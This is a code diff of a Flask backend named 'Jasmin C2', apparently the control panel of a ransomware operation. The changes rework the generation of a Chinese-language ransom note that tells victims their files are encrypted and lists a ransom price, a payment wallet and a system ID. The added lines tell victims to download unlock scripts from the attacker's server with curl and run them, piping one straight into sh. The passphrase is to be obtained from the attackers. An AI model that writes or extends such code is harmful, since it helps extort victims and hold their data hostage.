@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """Jasmin C2 — Python Flask Backend with MySQL + Web Install Wizard"""
-import os, secrets, json, datetime
+import os, re, secrets, json, datetime
 from functools import wraps
 from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory, send_file, flash, Response
 from flask_sqlalchemy import SQLAlchemy
@@ -410,7 +410,18 @@ def generate():
     else:
         return jsonify(ok=False, msg='RSA公钥缺失，请先生成密钥对')
     # 构建勒索信
-    dec = '运行 Jasmin_Decryptor.exe → 选择.pem私钥' if plat=='win' else 'sh jasmin_decrypt_openssl.sh private_key.pem /  （仅需 openssl，无需安装依赖）\n如偏爱 Python 工具: python3 jasmin_decrypt.py private_key.pem'
+    srv = re.sub(r'/handshake\.php$', '', c2)
+    if not srv: srv = 'http://<后台地址>'
+    # 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh（纯 openssl），
+    # Windows 用 jasmin_unlock.ps1（纯 PowerShell 7+，无需编译 exe）
+    if plat == 'win':
+        dec = ('Windows (需 PowerShell 7+)\n'
+               f'  curl.exe -sL {srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n'
+               f'  pwsh -File unlock.ps1 -Server {srv} -K "<解密口令>" -Paths C:\\目标目录')
+    else:
+        dec = ('Linux / macOS（纯 openssl，无需安装任何依赖）\n'
+               f'  curl -sL {srv}/payloads/jasmin_unlock.sh | sh -s {srv} "<解密口令>" <目标目录>\n'
+               '  （解密口令与目标目录请向我们索取）')
     note = f"╔══════════════════════════════════════════╗\n║  {ransom['title']}\n║  你的文件已被加密\n╚══════════════════════════════════════════╝\n\n系统ID: {{sid}}\n\n{ransom['body']}\n"
     if ransom['price']: note += f"\n💰 赎金: {ransom['price']}"
     if ransom['wallet']: note += f"\n💳 支付地址: {ransom['wallet']}"
